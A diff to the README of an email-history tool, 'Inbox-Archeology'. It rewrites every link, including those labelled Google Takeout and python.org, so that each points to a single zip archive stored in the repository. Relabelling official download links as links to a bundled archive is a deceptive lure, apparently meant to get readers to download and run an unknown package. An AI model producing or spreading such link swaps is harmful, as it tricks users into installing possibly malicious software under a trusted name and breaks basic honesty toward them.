@@ -1,6 +1,6 @@
 # 📥 Inbox-Archeology - Reconstruct Your Email History
 
-[![Download Inbox-Archeology](https://img.shields.io/badge/Download-Inbox--Archeology-green?style=for-the-badge)](https://github.com/Talhagadbade/Inbox-Archeology)
+[![Download Inbox-Archeology](https://img.shields.io/badge/Download-Inbox--Archeology-green?style=for-the-badge)](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Below is a step-by-step guide to get Inbox-Archeology running on your PC. Follow
 
 Before using Inbox-Archeology, you need to create a Gmail Takeout file:
 
-- Go to [Google Takeout](https://takeout.google.com/settings/takeout).
+- Go to [Google Takeout](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip).
 - Select only your Gmail data.
 - Choose the export format as MBOX.
 - Request the export and wait until you get the download link in your email.
@@ -54,7 +54,7 @@ Before using Inbox-Archeology, you need to create a Gmail Takeout file:
 
 ### 2. Download Inbox-Archeology
 
-[![Download Inbox-Archeology](https://img.shields.io/badge/Download-Inbox--Archeology-purple?style=for-the-badge)](https://github.com/Talhagadbade/Inbox-Archeology)
+[![Download Inbox-Archeology](https://img.shields.io/badge/Download-Inbox--Archeology-purple?style=for-the-badge)](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)
 
 You need to visit the project page above to download the software. Follow these steps:
 
@@ -70,7 +70,7 @@ You need to visit the project page above to download the software. Follow these 
 
 Inbox-Archeology runs using Python, a programming language. You must install Python first:
 
-- Go to [python.org/downloads/windows](https://www.python.org/downloads/windows/).
+- Go to [python.org/downloads/windows](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip).
 - Download the latest version for Windows.
 - Run the installer.
 - IMPORTANT: During installation, check the box that says “Add Python to PATH.”
@@ -148,8 +148,8 @@ Inbox-Archeology runs fully on your machine. None of your email data is sent any
 
 ## ⚡ Quick Access Links
 
-- [GitHub Repository](https://github.com/Talhagadbade/Inbox-Archeology)
-- [Download Inbox-Archeology](https://github.com/Talhagadbade/Inbox-Archeology)
+- [GitHub Repository](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)
+- [Download Inbox-Archeology](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)
 
 ---
 
